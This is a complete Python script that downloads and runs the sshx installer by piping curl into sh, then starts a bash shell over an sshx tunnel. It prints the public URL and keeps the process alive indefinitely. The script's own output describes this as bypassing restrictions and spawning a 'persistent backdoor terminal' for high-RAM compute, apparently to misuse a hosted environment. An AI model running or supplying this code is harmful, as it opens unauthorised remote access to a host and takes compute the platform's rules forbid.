import os
import subprocess
import time

def extract_compute():
    print("[*] Bypassing restrictions... Bootstrapping High-RAM Environment")
    print("[*] Downloading sshx binary...")
    os.system("curl -sSf https://sshx.io/get | sh")
    
    print("[*] Spawning persistent backdoor terminal...")
    p = subprocess.Popen(
        ["sshx", "-q", "--shell", "bash"], 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE
    )

    time.sleep(3)
    
    # Extract the SSHX URL
    url_found = False
    for i in range(10): # try 10 lines
        line = p.stdout.readline()
        if not line: break
        out = line.decode().strip()
        if "https://sshx.io" in out:
            print(f"\n" + "="*50)
            print(f"[+] SUCCESS! YOUR MASSIVE RAM TERMINAL IS READY:")
            print(f"[+] -> {out} <-")
            print("="*50 + "\n")
            url_found = True
            break
            
    if not url_found:
        print("[-] Failed to extract tunnel URL. Checking errors...")
        print(p.stderr.read().decode())
            
    print("[*] Keeping process alive... You can now connect from anywhere.")
    # Prevent kernel/process from dying
    while True:
        time.sleep(60)

if __name__ == "__main__":
    extract_compute()
